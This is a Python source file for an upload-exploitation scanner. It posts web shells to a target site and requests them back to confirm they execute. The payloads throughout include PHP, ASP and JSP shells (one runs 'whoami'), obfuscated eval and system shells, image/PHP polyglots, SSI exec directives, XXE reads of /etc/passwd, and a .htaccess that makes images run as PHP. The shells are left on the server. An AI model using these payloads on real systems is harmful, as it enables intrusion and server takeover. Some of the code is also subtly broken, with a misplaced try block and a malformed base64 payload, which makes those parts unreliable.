"""
Malicious File Execution Scanner (Professional Pentesting Edition)
==================================================================

Advanced scanner detecting if uploaded files can be executed on the server.
Uses techniques from real-world penetration testing engagements.

Features:
- PHP/ASP/JSP web shell upload & execution
- Polyglot file creation (valid image + executable code)
- Server-Side Include (SSI) injection
- SVG/XML with embedded scripts
- PHAR deserialization attacks
- .htaccess upload for execution control
- Web shell obfuscation techniques

CWE: CWE-434, CWE-94, CWE-96, CWE-97
OWASP: A01:2021, A03:2021

Author: BreachScan Professional Pentesting Framework
Version: 2.0.0
"""

import logging
import httpx
import asyncio
import hashlib
import re
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs

logger = logging.getLogger(__name__)


class MaliciousFileScanner:
    """
    Professional-grade malicious file execution scanner
    
    Tests for:
    1. PHP/ASP/JSP web shell execution
    2. Polyglot files (image + code)
    3. Server-Side Includes (SSI)
    4. SVG XSS and script execution
    5. XML External Entity (XXE) in SVG
    6. PHAR deserialization
    7. .htaccess upload for execution control
    8. Web shell obfuscation bypass
    """
    
    def __init__(self, target_url: str, timeout: int = None, **kwargs):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.findings = []
        self.test_mode = kwargs.get('test_mode', 'aggressive')  # passive, normal, aggressive
        
        self.cookies = kwargs.get('session_cookies') or kwargs.get('cookies', {})
        
        # Generate unique markers for this scan
        self.scan_id = hashlib.md5(f"{target_url}{datetime.now().isoformat()}".encode()).hexdigest()[:8]
        self.unique_marker = f"MALEXEC_{self.scan_id}_{int(datetime.now().timestamp())}"
        
        # Upload endpoints to test
        self.upload_endpoints = [
            '/upload', '/upload.php', '/api/upload', '/api/v1/upload',
            '/file/upload', '/files/upload', '/media/upload',
            '/admin/upload', '/user/upload', '/profile/upload',
            '/image/upload', '/avatar/upload', '/document/upload',
            '/files', '/file-upload', '/import', '/assignments', 
            '/upload-file', '/share', '/documents'
        ]
        
        # Common upload directories
        self.upload_dirs = [
            '/uploads/', '/files/', '/media/', '/upload/',
            '/images/', '/img/', '/assets/', '/static/',
            '/user_files/', '/attachments/', '/documents/'
        ]
    
    async def _discover_upload_endpoints(self) -> List[str]:
        """Discover upload endpoints through crawling and common paths"""
        discovered = set()
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True, cookies=self.cookies) as client:
            try:
                logger.info(f"[{self.scan_id}] Crawling base URL for upload forms: {self.target_url}")
                base_resp = await client.get(self.target_url)
                if base_resp.status_code == 200:
                    text = base_resp.text
                    import re
                    if 'type="file"' in text.lower() or 'multipart/form-data' in text.lower():
                        discovered.add(self.target_url)
                    
                    # Find Links
                    links = re.findall(r'href=["\'](.*?)["\']', text, re.IGNORECASE)
                    for link in links:
                        if link.startswith('#') or link.startswith('javascript:'): continue
                        if any(k in link.lower() for k in ['upload', 'file', 'import', 'attach', 'assignment', 'submit']):
                            full_url = urljoin(self.target_url, link)
                            if urlparse(full_url).scheme in ['http', 'https']:
                                discovered.add(full_url)
                    
                    # Find Actions
                    actions = re.findall(r'action=["\'](.*?)["\']', text, re.IGNORECASE)
                    for action in actions:
                         if any(k in action.lower() for k in ['upload', 'file', 'submit', 'save']):
                             full_url = urljoin(self.target_url, action)
                             discovered.add(full_url)
            except Exception as e:
                logger.debug(f"[{self.scan_id}] Crawling failed: {e}")

            # Test endpoints
            for endpoint in self.upload_endpoints:
                url = urljoin(self.target_url, endpoint)
                if url in discovered: continue
                try:
                    response = await client.get(url)
                    if response.status_code < 400:
                        content = response.text.lower()
                        if any(keyword in content for keyword in ['upload', 'file', 'attach', 'browse', 'input type="file"', 'directory']):
                            discovered.add(url)
                except: continue
        return list(discovered)

    async def scan(self) -> Dict[str, Any]:
        """Execute comprehensive malicious file execution scan"""
        
        logger.info(f"[{self.scan_id}] Starting Malicious File Execution scan for {self.target_url}")
        logger.info(f"[{self.scan_id}] Unique Marker: {self.unique_marker}")
        
        # Discover endpoints
        discovered = await self._discover_upload_endpoints()
        if discovered:
            self.upload_endpoints = discovered
            logger.info(f"[{self.scan_id}] Discovered {len(discovered)} upload endpoints")
        else:
            logger.warning(f"[{self.scan_id}] No upload endpoints discovered, using defaults")
        
        start_time = datetime.now()
        
        # Test execution scenarios (ordered by severity)
        await self._test_php_web_shell()
        await self._test_asp_web_shell()
        await self._test_jsp_web_shell()
        await self._test_polyglot_files()
        await self._test_server_side_inclusion()
        await self._test_svg_script_execution()
        await self._test_svg_xxe()
        await self._test_phar_deserialization()
        await self._test_htaccess_upload()
        await self._test_obfuscated_shells()
        
        scan_duration = (datetime.now() - start_time).total_seconds()
        
        logger.info(f"[{self.scan_id}] Scan complete: {len(self.findings)} findings in {scan_duration:.2f}s")
        
        return self._generate_results(scan_duration)
    
    async def _test_php_web_shell(self):
        """Test PHP web shell upload and execution"""
        
        logger.debug(f"[{self.scan_id}] Testing PHP web shell execution")
        
        # Multiple PHP shell variants
        php_shells = [
            # Basic echo test
            (f'<?php echo "{self.unique_marker}"; ?>', 'basic_echo'),
            # System command execution
            (f'<?php echo "{self.unique_marker}"; echo "|"; system("whoami"); ?>', 'system_whoami'),
            # Short tag variant
            (f'<? echo "{self.unique_marker}"; ?>', 'short_tag'),
            # Alternative syntax
            (f'<?= "{self.unique_marker}" ?>', 'short_echo'),
            # Obfuscated
            (f'<?php $a="system"; $a("echo {self.unique_marker}"); ?>', 'obfuscated'),
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True, cookies=self.cookies) as client:
            for php_code, variant in php_shells:
                for upload_endpoint in self.upload_endpoints:
                    upload_url = urljoin(self.target_url, upload_endpoint)
                    
                try:
                    # Upload PHP file
                        filename = f'shell_{self.scan_id}_{variant}.php'
                        files = {'file': (filename, php_code, 'application/x-php')}
                        
                        logger.debug(f"[{self.scan_id}] Uploading {filename} to {upload_url}")
                        upload_response = await client.post(upload_url, files=files)
                        
                        if upload_response.status_code < 400:
                            # Try to locate and execute the uploaded file
                            execution_url = await self._find_uploaded_file(client, filename, upload_response)
                            
                            if execution_url:
                                exec_response = await client.get(execution_url)
                                
                                if self.unique_marker in exec_response.text:
                                    self._add_finding(
                                        title='CRITICAL: Remote Code Execution via PHP File Upload',
                                        severity='critical',
                                        description=f'Uploaded PHP file ({variant}) executes on server',
                                        location=upload_url,
                                        evidence={
                                            'upload_url': upload_url,
                                            'execution_url': execution_url,
                                            'filename': filename,
                                            'marker_found': True,
                                            'variant': variant,
                                            'response_snippet': exec_response.text[:500]
                                        },
                                        cwe='CWE-94',
                                        owasp='A03:2021 - Injection',
                                        technique='PHP Web Shell Upload'
                                    )
                                    logger.critical(f"[{self.scan_id}] RCE FOUND: {execution_url}")
                                    return  # Stop on first RCE
                    
                except Exception as e:
                        logger.debug(f"[{self.scan_id}] Error in PHP shell test: {e}")
                        continue
    
    async def _test_asp_web_shell(self):
        """Test ASP/ASPX web shell upload"""
        
        logger.debug(f"[{self.scan_id}] Testing ASP web shell execution")
        
        asp_shells = [
            (f'<%Response.Write("{self.unique_marker}")%>', 'asp', 'asp_classic'),
            (f'<%@ Page Language="C#" %><%Response.Write("{self.unique_marker}");%>', 'aspx', 'aspx_csharp'),
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True, cookies=self.cookies) as client:
            for asp_code, extension, variant in asp_shells:
                for upload_endpoint in self.upload_endpoints:
                    upload_url = urljoin(self.target_url, upload_endpoint)
                    
                    try:
                        filename = f'shell_{self.scan_id}.{extension}'
                        files = {'file': (filename, asp_code, 'text/plain')}
                        
                        upload_response = await client.post(upload_url, files=files)
                        
                        if upload_response.status_code < 400:
                            execution_url = await self._find_uploaded_file(client, filename, upload_response)
                            
                            if execution_url:
                                exec_response = await client.get(execution_url)
                                
                                if self.unique_marker in exec_response.text:
                                    self._add_finding(
                                        title='CRITICAL: Remote Code Execution via ASP File Upload',
                                        severity='critical',
                                        description=f'Uploaded ASP file ({variant}) executes on server',
                                        location=upload_url,
                                        evidence={
                                            'upload_url': upload_url,
                                            'execution_url': execution_url,
                                            'filename': filename,
                                            'variant': variant
                                        },
                                        cwe='CWE-94',
                                        owasp='A03:2021 - Injection',
                                        technique='ASP Web Shell Upload'
                                    )
                                    logger.critical(f"[{self.scan_id}] ASP RCE FOUND: {execution_url}")
                                    return
                    
                    except Exception as e:
                        logger.debug(f"[{self.scan_id}] Error in ASP shell test: {e}")
                        continue
    
    async def _test_jsp_web_shell(self):
        """Test JSP web shell upload"""
        
        logger.debug(f"[{self.scan_id}] Testing JSP web shell execution")
        
        jsp_code = f'<% out.println("{self.unique_marker}"); %>'
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True, cookies=self.cookies) as client:
            for upload_endpoint in self.upload_endpoints:
                upload_url = urljoin(self.target_url, upload_endpoint)
                
                try:
                    filename = f'shell_{self.scan_id}.jsp'
                    files = {'file': (filename, jsp_code, 'text/plain')}
                    
                    upload_response = await client.post(upload_url, files=files)
                    
                    if upload_response.status_code < 400:
                        execution_url = await self._find_uploaded_file(client, filename, upload_response)
                        
                        if execution_url:
                            exec_response = await client.get(execution_url)
                            
                            if self.unique_marker in exec_response.text:
                                self._add_finding(
                                    title='CRITICAL: Remote Code Execution via JSP File Upload',
                                    severity='critical',
                                    description='Uploaded JSP file executes on server',
                                    location=upload_url,
                                    evidence={
                                        'upload_url': upload_url,
                                        'execution_url': execution_url,
                                        'filename': filename
                                    },
                                    cwe='CWE-94',
                                    owasp='A03:2021 - Injection',
                                    technique='JSP Web Shell Upload'
                                )
                                logger.critical(f"[{self.scan_id}] JSP RCE FOUND: {execution_url}")
                                return
                
                except Exception as e:
                    logger.debug(f"[{self.scan_id}] Error in JSP shell test: {e}")
                    continue
    
    async def _test_polyglot_files(self):
        """Test polyglot files (valid as both image and executable)"""
        
        logger.debug(f"[{self.scan_id}] Testing polyglot file execution")
        
        # Polyglot: Valid GIF + PHP
        gif_php = f'GIF89a;\n<?php echo "{self.unique_marker}"; ?>\n;'.encode()
        
        # Polyglot: Valid JPEG + PHP
        jpeg_php = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' + f'<?php echo "{self.unique_marker}"; ?>'.encode()
        
        polyglots = [
            (gif_php, 'polyglot_gif.php', 'image/gif'),
            (jpeg_php, 'polyglot_jpg.php', 'image/jpeg'),
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True, cookies=self.cookies) as client:
            for content, filename, mime_type in polyglots:
                for upload_endpoint in self.upload_endpoints:
                    upload_url = urljoin(self.target_url, upload_endpoint)
                    
                    try:
                        files = {'file': (f'{self.scan_id}_{filename}', content, mime_type)}
                        upload_response = await client.post(upload_url, files=files)
                        
                        if upload_response.status_code < 400:
                            execution_url = await self._find_uploaded_file(client, f'{self.scan_id}_{filename}', upload_response)
                            
                            if execution_url:
                                exec_response = await client.get(execution_url)
                                
                                if self.unique_marker in exec_response.text:
                                    self._add_finding(
                                        title='CRITICAL: Polyglot File Execution (Image + PHP)',
                                        severity='critical',
                                        description=f'Polyglot file (valid {mime_type} + PHP) executes as PHP',
                                        location=upload_url,
                                        evidence={
                                            'upload_url': upload_url,
                                            'execution_url': execution_url,
                                            'filename': filename,
                                            'mime_type': mime_type
                                        },
                                        cwe='CWE-434',
                                        owasp='A03:2021 - Injection',
                                        technique='Polyglot File Attack'
                                    )
                                    logger.critical(f"[{self.scan_id}] Polyglot execution FOUND: {execution_url}")
                                    return
                    
                    except Exception as e:
                        logger.debug(f"[{self.scan_id}] Error in polyglot test: {e}")
                    continue
    
    async def _test_server_side_inclusion(self):
        """Test Server-Side Include (SSI) injection"""
        
        logger.debug(f"[{self.scan_id}] Testing SSI injection")
        
        # SSI payloads
        ssi_payloads = [
            f'<!--#echo var="DATE_LOCAL" --><!--#exec cmd="echo {self.unique_marker}" -->',
            f'<!--#exec cmd="echo {self.unique_marker}" -->',
            f'<!--#include virtual="/etc/passwd" --><!--#exec cmd="echo {self.unique_marker}" -->',
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True, cookies=self.cookies) as client:
            for ssi_payload in ssi_payloads:
                for upload_endpoint in self.upload_endpoints:
                    upload_url = urljoin(self.target_url, upload_endpoint)
                    
                    try:
                        filename = f'ssi_{self.scan_id}.shtml'
                        files = {'file': (filename, ssi_payload, 'text/html')}
                        
                        upload_response = await client.post(upload_url, files=files)
                        
                        if upload_response.status_code < 400:
                            execution_url = await self._find_uploaded_file(client, filename, upload_response)
                            
                            if execution_url:
                                exec_response = await client.get(execution_url)
                                
                                if self.unique_marker in exec_response.text or 'root:' in exec_response.text:
                                    self._add_finding(
                                        title='CRITICAL: Server-Side Include (SSI) Injection',
                                        severity='critical',
                                        description='Uploaded SHTML file with SSI directives executes on server',
                                        location=upload_url,
                                        evidence={
                                            'upload_url': upload_url,
                                            'execution_url': execution_url,
                                            'filename': filename,
                                            'marker_found': self.unique_marker in exec_response.text
                                        },
                                        cwe='CWE-97',
                                        owasp='A03:2021 - Injection',
                                        technique='SSI Injection'
                                    )
                                    logger.critical(f"[{self.scan_id}] SSI injection FOUND: {execution_url}")
                    
                    except Exception as e:
                        logger.debug(f"[{self.scan_id}] Error in SSI test: {e}")
                        continue
    
    async def _test_svg_script_execution(self):
        """Test SVG files with embedded JavaScript execution"""
        
        logger.debug(f"[{self.scan_id}] Testing SVG script execution")
        
        # SVG XSS payloads
        svg_payloads = [
            f'''<svg xmlns="http://www.w3.org/2000/svg" onload="document.write('{self.unique_marker}')">
<circle cx="50" cy="50" r="40"/>
</svg>''',
            f'''<svg xmlns="http://www.w3.org/2000/svg">
<script>document.write('{self.unique_marker}')</script>
<circle cx="50" cy="50" r="40"/>
</svg>''',
            f'''<svg xmlns="http://www.w3.org/2000/svg">
<image href="x" onerror="document.write('{self.unique_marker}')"/>
</svg>''',
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True, cookies=self.cookies) as client:
            for svg_payload in svg_payloads:
                for upload_endpoint in self.upload_endpoints:
                    upload_url = urljoin(self.target_url, upload_endpoint)
                    
                    try:
                        filename = f'xss_{self.scan_id}.svg'
                        files = {'file': (filename, svg_payload, 'image/svg+xml')}
                        
                        upload_response = await client.post(upload_url, files=files)
                        
                        # Check if SVG is accepted and served with dangerous Content-Type
                        if upload_response.status_code < 400:
                            execution_url = await self._find_uploaded_file(client, filename, upload_response)
                            
                            if execution_url:
                                exec_response = await client.get(execution_url)
                                content_type = exec_response.headers.get('Content-Type', '').lower()
                                
                                # Check if SVG is served with executable content type
                                if 'svg' in content_type and ('onload' in exec_response.text or '<script>' in exec_response.text):
                                    self._add_finding(
                                        title='HIGH: SVG Upload with Embedded Scripts (XSS)',
                                        severity='high',
                                        description='SVG files with embedded JavaScript are accepted and served',
                                        location=upload_url,
                                        evidence={
                                            'upload_url': upload_url,
                                            'execution_url': execution_url,
                                            'filename': filename,
                                            'content_type': content_type,
                                            'has_script': '<script>' in exec_response.text,
                                            'has_onload': 'onload' in exec_response.text
                                        },
                                        cwe='CWE-79',
                                        owasp='A03:2021 - Injection',
                                        technique='SVG XSS'
                                    )
                                    logger.warning(f"[{self.scan_id}] SVG XSS found: {execution_url}")
                    
                    except Exception as e:
                        logger.debug(f"[{self.scan_id}] Error in SVG test: {e}")
                        continue
    
    async def _test_svg_xxe(self):
        """Test XML External Entity (XXE) in SVG files"""
        
        logger.debug(f"[{self.scan_id}] Testing SVG XXE")
        
        svg_xxe = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
<text x="10" y="20">&xxe;</text>
<text x="10" y="40">{self.unique_marker}</text>
</svg>'''
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True, cookies=self.cookies) as client:
            for upload_endpoint in self.upload_endpoints:
                upload_url = urljoin(self.target_url, upload_endpoint)
                
                try:
                    filename = f'xxe_{self.scan_id}.svg'
                    files = {'file': (filename, svg_xxe, 'image/svg+xml')}
                    
                    upload_response = await client.post(upload_url, files=files)
                    
                    if upload_response.status_code < 400:
                        execution_url = await self._find_uploaded_file(client, filename, upload_response)
                        
                        if execution_url:
                            exec_response = await client.get(execution_url)
                            
                            # Check for file disclosure
                            if 'root:' in exec_response.text or 'bin/bash' in exec_response.text:
                                self._add_finding(
                                    title='CRITICAL: XML External Entity (XXE) in SVG Upload',
                                    severity='critical',
                                    description='SVG file with XXE payload discloses server files',
                                    location=upload_url,
                                    evidence={
                                        'upload_url': upload_url,
                                        'execution_url': execution_url,
                                        'filename': filename,
                                        'file_disclosed': True
                                    },
                                    cwe='CWE-611',
                                    owasp='A05:2021 - Security Misconfiguration',
                                    technique='XXE in SVG'
                                )
                                logger.critical(f"[{self.scan_id}] SVG XXE FOUND: {execution_url}")
                
                except Exception as e:
                    logger.debug(f"[{self.scan_id}] Error in SVG XXE test: {e}")
                    continue
    
    async def _test_phar_deserialization(self):
        """Test PHAR deserialization attacks"""
        
        logger.debug(f"[{self.scan_id}] Testing PHAR deserialization")
        
        # Note: This is a simplified test - real PHAR exploitation is more complex
        phar_payload = f'<?php __HALT_COMPILER(); /* {self.unique_marker} */ ?>'
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True, cookies=self.cookies) as client:
            for upload_endpoint in self.upload_endpoints:
                upload_url = urljoin(self.target_url, upload_endpoint)
                
                try:
                    filename = f'malicious_{self.scan_id}.phar'
                    files = {'file': (filename, phar_payload, 'application/octet-stream')}
                    
                    upload_response = await client.post(upload_url, files=files)
                    
                    if upload_response.status_code < 400:
                        self._add_finding(
                            title='MEDIUM: PHAR File Upload Accepted',
                            severity='medium',
                            description='PHAR files are accepted - potential deserialization vulnerability',
                            location=upload_url,
                            evidence={
                                'upload_url': upload_url,
                                'filename': filename,
                                'note': 'PHAR files can be used for object injection attacks'
                            },
                            cwe='CWE-502',
                            owasp='A08:2021 - Software and Data Integrity Failures',
                            technique='PHAR Deserialization'
                        )
                        logger.warning(f"[{self.scan_id}] PHAR upload accepted: {upload_url}")
                
                except Exception as e:
                    logger.debug(f"[{self.scan_id}] Error in PHAR test: {e}")
                    continue
    
    async def _test_htaccess_upload(self):
        """Test .htaccess file upload for execution control"""
        
        logger.debug(f"[{self.scan_id}] Testing .htaccess upload")
        
        # .htaccess to allow PHP execution
        htaccess_content = '''AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .jpg
SetHandler application/x-httpd-php'''
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True, cookies=self.cookies) as client:
            for upload_endpoint in self.upload_endpoints:
                upload_url = urljoin(self.target_url, upload_endpoint)
                
                try:
                    files = {'file': ('.htaccess', htaccess_content, 'text/plain')}
                    upload_response = await client.post(upload_url, files=files)
                    
                    if upload_response.status_code < 400:
                        self._add_finding(
                            title='HIGH: .htaccess File Upload Accepted',
                            severity='high',
                            description='.htaccess file upload allows modifying Apache configuration',
                            location=upload_url,
                            evidence={
                                'upload_url': upload_url,
                                'filename': '.htaccess',
                                'impact': 'Can enable PHP execution for image files'
                            },
                            cwe='CWE-434',
                            owasp='A05:2021 - Security Misconfiguration',
                            technique='.htaccess Upload'
                        )
                        logger.warning(f"[{self.scan_id}] .htaccess upload accepted: {upload_url}")
                
                except Exception as e:
                    logger.debug(f"[{self.scan_id}] Error in .htaccess test: {e}")
                    continue
    
    async def _test_obfuscated_shells(self):
        """Test obfuscated web shells"""
        
        logger.debug(f"[{self.scan_id}] Testing obfuscated shells")
        
        # Various obfuscation techniques
        obfuscated_shells = [
            # Base64 encoding
            (f'<?php eval(base64_decode("ZWNobyAie{self.unique_marker}Ijs=")); ?>', 'base64_eval'),
            # Variable function call
            (f'<?php $f="system"; $f("echo {self.unique_marker}"); ?>', 'var_function'),
            # String concatenation
            (f'<?php $a="sys"."tem"; $a("echo {self.unique_marker}"); ?>', 'concat'),
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True, cookies=self.cookies) as client:
            for php_code, variant in obfuscated_shells:
                for upload_endpoint in self.upload_endpoints:
                    upload_url = urljoin(self.target_url, upload_endpoint)
                    
                    try:
                        filename = f'obf_{self.scan_id}_{variant}.php'
                        files = {'file': (filename, php_code, 'text/plain')}
                        
                        upload_response = await client.post(upload_url, files=files)
                        
                        if upload_response.status_code < 400:
                            execution_url = await self._find_uploaded_file(client, filename, upload_response)
                            
                            if execution_url:
                                exec_response = await client.get(execution_url)
                                
                                if self.unique_marker in exec_response.text:
                                    self._add_finding(
                                        title='CRITICAL: Obfuscated Web Shell Execution',
                                        severity='critical',
                                        description=f'Obfuscated PHP shell ({variant}) executes successfully',
                                        location=upload_url,
                                        evidence={
                                            'upload_url': upload_url,
                                            'execution_url': execution_url,
                                            'filename': filename,
                                            'obfuscation_type': variant
                                        },
                                        cwe='CWE-94',
                                        owasp='A03:2021 - Injection',
                                        technique='Obfuscated Web Shell'
                                    )
                                    logger.critical(f"[{self.scan_id}] Obfuscated shell executed: {variant}")
                    
                    except Exception as e:
                        logger.debug(f"[{self.scan_id}] Error in obfuscated shell test: {e}")
                        continue
    
    async def _find_uploaded_file(self, client: httpx.AsyncClient, filename: str, 
                                   upload_response: httpx.Response) -> Optional[str]:
        """Try to find the uploaded file location"""
        
        # Parse upload response for file URL
        response_text = upload_response.text
        
        # Look for common URL patterns in response
        url_patterns = [
            r'href=["\']([^"\']*' + re.escape(filename) + r'[^"\']*)["\']',
            r'src=["\']([^"\']*' + re.escape(filename) + r'[^"\']*)["\']',
            r'"url":\s*"([^"]*' + re.escape(filename) + r'[^"]*)"',
            r'"path":\s*"([^"]*' + re.escape(filename) + r'[^"]*)"',
        ]
        
        for pattern in url_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                file_path = match.group(1)
                file_url = urljoin(self.target_url, file_path)
                
                # Verify file is accessible
                try:
                    test_response = await client.get(file_url)
                    if test_response.status_code < 400:
                        return file_url
                except:
                    continue
        
        # Try common upload directories
        for upload_dir in self.upload_dirs:
            possible_url = urljoin(self.target_url, upload_dir + filename)
            try:
                test_response = await client.get(possible_url)
                if test_response.status_code < 400:
                    return possible_url
            except:
                continue
        
        return None
    
    def _add_finding(self, title: str, severity: str, description: str, 
                     location: str, evidence: Dict, cwe: str, owasp: str, technique: str):
        """Add a vulnerability finding"""
        
        finding = {
            'id': f"malicious_exec_{len(self.findings)}_{self.scan_id}",
            'title': title,
            'severity': severity,
            'description': description,
            'location': location,
            'evidence': evidence,
            'cwe': cwe,
            'owasp': owasp,
            'technique': technique,
            'timestamp': datetime.now().isoformat(),
            'recommendation': self._get_recommendation(technique)
        }
        
        self.findings.append(finding)
    
    def _get_recommendation(self, technique: str) -> str:
        """Get remediation recommendation"""
        
        recommendations = {
            'PHP Web Shell Upload': 'Block PHP file uploads. Store uploaded files outside webroot. Disable script execution in upload directories.',
            'ASP Web Shell Upload': 'Block ASP/ASPX file uploads. Configure IIS to not execute scripts in upload directories.',
            'JSP Web Shell Upload': 'Block JSP file uploads. Configure application server to not execute JSP in upload directories.',
            'Polyglot File Attack': 'Re-encode uploaded images. Use Content Security Policy (CSP). Serve uploads from separate domain.',
            'SSI Injection': 'Disable Server-Side Includes. Sanitize uploaded HTML content. Use text/plain Content-Type for user uploads.',
            'SVG XSS': 'Sanitize SVG files. Remove script tags and event handlers. Serve with Content-Disposition: attachment.',
            'XXE in SVG': 'Disable external entity processing in XML parser. Validate and sanitize XML content.',
            'PHAR Deserialization': 'Block PHAR file uploads. Avoid using phar:// wrapper with user input.',
            '.htaccess Upload': 'Block .htaccess uploads. Use AllowOverride None in Apache configuration.',
            'Obfuscated Web Shell': 'Implement comprehensive content scanning. Use signature-based and behavioral detection.'
        }
        
        return recommendations.get(technique, 'Implement comprehensive file upload security controls.')
    
    def _generate_results(self, scan_duration: float) -> Dict[str, Any]:
        """Generate scan results"""
        
        severity_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        for finding in self.findings:
            severity = finding.get('severity', 'info').lower()
            if severity in severity_counts:
                severity_counts[severity] += 1
        
        return {
            'scanner': 'Malicious File Execution Scanner (Professional Edition)',
            'scan_id': self.scan_id,
            'target': self.target_url,
            'status': 'completed',
            'unique_marker': self.unique_marker,
            'test_mode': self.test_mode,
            'findings': self.findings,
            'summary': {
                'total_findings': len(self.findings),
                'severity_distribution': severity_counts,
                'scan_duration_seconds': scan_duration
            },
                        'timestamp': datetime.now().isoformat()
        }


def create_scanner(target_url: str, **kwargs):
    """Factory function to create scanner instance"""
    return MaliciousFileScanner(target_url, **kwargs)
